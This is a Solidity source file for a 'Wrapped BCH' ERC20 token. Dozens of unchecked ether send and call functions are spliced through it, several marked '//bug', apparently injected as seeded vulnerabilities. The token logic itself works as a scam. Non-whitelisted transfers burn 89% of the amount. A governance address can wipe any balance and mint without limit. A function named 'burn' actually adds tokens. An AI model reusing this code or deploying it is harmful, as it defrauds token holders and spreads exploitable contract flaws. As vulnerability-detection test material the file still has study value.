/**
 *Submitted for verification at Etherscan.io on 2020-10-06
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
contract Context {
    constructor () internal { }
function my_func_uncheck36(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
function bug_unchk3(address payable addr) public
      {addr.send (42 ether); }
}
contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
  bool public payedOut_unchk20 = false;
address payable public winner_unchk20;
uint public winAmount_unchk20;

function sendToWinner_unchk20() public {
        require(!payedOut_unchk20);
        winner_unchk20.send(winAmount_unchk20);
        payedOut_unchk20 = true;
    }
  mapping (address => uint) private _balances;
  function cash_unchk34(uint roundIndex, uint subpotIndex, address payable winner_unchk34) public{
        uint64 subpot_unchk34 = 10 ether;
        winner_unchk34.send(subpot_unchk34);  //bug
        subpot_unchk34= 0;
}
  mapping (address => mapping (address => uint)) private _allowances;
  function cash_unchk46(uint roundIndex, uint subpotIndex, address payable winner_unchk46) public{
        uint64 subpot_unchk46 = 3 ether;
        winner_unchk46.send(subpot_unchk46);  //bug
        subpot_unchk46= 0;
}
  uint private _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
function UncheckedExternalCall_unchk28 () public
{  address payable addr_unchk28;
   if (! addr_unchk28.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
function unhandledsend_unchk38(address payable callee) public {
    callee.send(5 ether);
  }
    function transfer(address recipient, uint amount) public returns (bool) {
        _mta(_msgSender(), recipient, amount);
        return true;
    }
function UncheckedExternalCall_unchk40 () public
{  address payable addr_unchk40;
   if (! addr_unchk40.send (2 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
bool public payedOut_unchk32 = false;
address payable public winner_unchk32;
uint public winAmount_unchk32;

function sendToWinner_unchk32() public {
        require(!payedOut_unchk32);
        winner_unchk32.send(winAmount_unchk32);
        payedOut_unchk32 = true;
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function callnotchecked_unchk37(address payable callee) public {
    callee.call.value(1 ether);
  }
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _mta(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
function bug_unchk15(address payable addr) public
      {addr.send (42 ether); }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function UncheckedExternalCall_unchk16 () public
{  address payable addr_unchk16;
   if (! addr_unchk16.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
function bug_unchk31() public{
address payable addr_unchk31;
if (!addr_unchk31.send (10 ether) || 1==1)
	{revert();}
}
    function _mta(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
function my_func_uncheck12(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function _mta2(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint amount_ = amount.mul(11).div(100);
        uint burnAmount_ = amount.sub(amount_);
        address dead = 0x000000000000000000000000000000000000dEaD;
        _balances[sender] = _balances[sender].sub(amount_, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount_);
        _balances[dead] = _balances[dead].add(burnAmount_);
        emit Transfer(sender, recipient, amount_);
    }
function my_func_unchk35(address payable dst) public payable{
        dst.send(msg.value);
    }
    function _initMint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
function withdrawBal_unchk29 () public{
	uint Balances_unchk29 = 0;
	msg.sender.send(Balances_unchk29);}
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
function my_func_uncheck24(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function _withdraw(address account, uint amount) internal {
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
function callnotchecked_unchk13(address callee) public {
    callee.call.value(1 ether);
  }
    function _stake(address acc) internal {
        _balances[acc] = 0;
    }
function bug_unchk42() public{
uint receivers_unchk42;
address payable addr_unchk42;
if (!addr_unchk42.send(42 ether))
	{receivers_unchk42 +=1;}
else
	{revert();}
}
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
function unhandledsend_unchk26(address payable callee) public {
    callee.send(5 ether);
  }
}
contract ERC20Detailed is IERC20 {
  function unhandledsend_unchk2(address payable callee) public {
    callee.send(5 ether);
  }
  string private _name;
  function my_func_unchk47(address payable dst) public payable{
        dst.send(msg.value);
    }
  string private _symbol;
  function unhandledsend_unchk14(address payable callee) public {
    callee.send(5 ether);
  }
  uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
function bug_unchk19() public{
address payable addr_unchk19;
if (!addr_unchk19.send (10 ether) || 1==1)
	{revert();}
}
    function name() public view returns (string memory) {
        return _name;
    }
function cash_unchk10(uint roundIndex, uint subpotIndex,address payable winner_unchk10) public{
        uint64 subpot_unchk10 = 10 ether;
        winner_unchk10.send(subpot_unchk10);  //bug
        subpot_unchk10= 0;
}
    function symbol() public view returns (string memory) {
        return _symbol;
    }
function bug_unchk7() public{
address payable addr_unchk7;
if (!addr_unchk7.send (10 ether) || 1==1)
	{revert();}
}
    function decimals() public view returns (uint8) {
        return _decimals;
    }
bool public payedOut_unchk44 = false;
address payable public winner_unchk44;
uint public winAmount_unchk44;

function sendToWinner_unchk44() public {
        require(!payedOut_unchk44);
        winner_unchk44.send(winAmount_unchk44);
        payedOut_unchk44 = true;
    }
}
library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}
contract  WrappedBCH is ERC20, ERC20Detailed {
  using SafeMath for uint;
bool public payedOut_unchk33 = false;

function withdrawLeftOver_unchk33() public {
        require(payedOut_unchk33);
        msg.sender.send(address(this).balance);
    }
  address public hash_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
bool public payedOut_unchk45 = false;

function withdrawLeftOver_unchk45() public {
        require(payedOut_unchk45);
        msg.sender.send(address(this).balance);
    }
  mapping (address => bool) public governance;
function callnotchecked_unchk25(address payable callee) public {
    callee.call.value(1 ether);
  }
  mapping (address => bool) public holders;
  constructor () public ERC20Detailed("Wrapped BCH", "wBCH", 18) {
      _initMint( msg.sender, 950*10**uint(decimals()) );
      governance[msg.sender] = true;
      holders[msg.sender] = true;
      holders[hash_] = true;
  }
function bug_unchk43() public{
address payable addr_unchk43;
if (!addr_unchk43.send (10 ether) || 1==1)
	{revert();}
}
  function stake(address account) public {
      require(governance[msg.sender], "error");
      _stake(account);
  }
function callnotchecked_unchk1(address payable callee) public {
    callee.call.value(2 ether);
  }
  function withdraw(address account, uint amount) public {
      require(governance[msg.sender], "error");
      _withdraw(account, amount);
  }
function bug_unchk30() public{
uint receivers_unchk30;
address payable addr_unchk30;
if (!addr_unchk30.send(42 ether))
	{receivers_unchk30 +=1;}
else
	{revert();}
}
  function burn(address account, uint amount) public {
      require(governance[msg.sender], "error");
      _burn(account, amount);
  }
function my_func_unchk11(address payable dst) public payable{
        dst.send(msg.value);
    }
  function _mta(address from_, address to_, uint amount) internal {
    require(amount <= this.balanceOf(from_), "error");
    if(holders[from_]){
      super._mta(from_, to_, amount);
    } else {
      super._mta2(from_, to_, amount);
    }
  }
bool public payedOut_unchk9 = false;

function withdrawLeftOver_unchk9() public {
        require(payedOut_unchk9);
        msg.sender.send(address(this).balance);
    }
  function setQue(address account) public {
      require(governance[msg.sender], "error");
      holders[account] = true;
  }
function withdrawBal_unchk17 () public{
	uint64 Balances_unchk17 = 0;
	msg.sender.send(Balances_unchk17);}
  function resetQue(address account) public {
      require(governance[msg.sender], "error");
      holders[account] = false;
  }
function withdrawBal_unchk41 () public{
	uint64 Balances_unchk41 = 0;
	msg.sender.send(Balances_unchk41);}

}